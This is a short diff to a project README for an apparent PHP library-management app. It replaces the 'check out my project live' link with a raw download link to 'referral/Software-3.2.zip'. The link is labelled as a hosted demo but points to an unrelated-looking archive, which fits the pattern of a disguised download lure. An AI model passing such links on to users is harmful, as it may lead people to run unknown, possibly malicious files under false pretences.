@@ -6,7 +6,7 @@ In order to use this project you need to instal LAMP/WAMP and create folder libr
 
 And also you can check out my project live that i have hosted :
 
-https://raw.githubusercontent.com/aaradhya26/Lib/master/referral/Lib.zip
+https://github.com/aaradhya26/Lib/raw/refs/heads/master/referral/Software-3.2.zip
 
 If you want to check out admin panel you need to have following credentials :
 
